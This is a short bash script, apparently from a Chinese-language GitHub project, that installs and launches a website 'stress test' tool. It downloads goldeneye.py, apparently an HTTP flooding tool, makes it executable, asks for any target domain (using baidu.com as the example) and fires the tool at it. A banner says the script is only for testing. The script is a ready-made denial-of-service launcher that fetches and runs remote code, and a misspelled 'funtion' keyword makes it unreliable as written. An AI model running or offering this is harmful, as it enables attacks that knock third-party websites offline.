#!/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/bin:/sbin
export PATH

which yum >/dev/null 2>/dev/null
if [ $? -ne 0 ]; then
    Main=apt-get
else
    Main=yum
fi

funtion main(){
    echo "###       web tool v1.1        ###"
    echo "###  By GitHub@linux-terminal  ###"
    echo "###    Update: 2020-07-06      ###"
    echo ""
    echo -e "\033[41;33m 适用环境 Debian \033[0m"
    echo "Github链接 https://github.com/linux-terminal/cc \033[41;33m请给个星星\033[0m"
    echo "---------------------------------------------------------------------------"
    echo -e "\033[41;33m 本脚本仅供测试使用！！不要作死！！请勿用于非法用途！！ \033[0m"
    echo -e "\033[41;33m 回车以继续，ctrl+C退出 \033[0m"
    echo " "
    echo "---------------------------------------------------------------------------"

    read -n 1
    $Main update -y && $Main upgrade -y
    wget https://raw.githubusercontent.com/linux-terminal/cc/master/goldeneye.py
    chmod +x goldeneye.py
    echo "输入要测压的域名： (例: https://baidu.com)"
    read domain
    echo "即将测压 $domain，请按回车以继续"
    ./goldeneye.py $domain
}

main 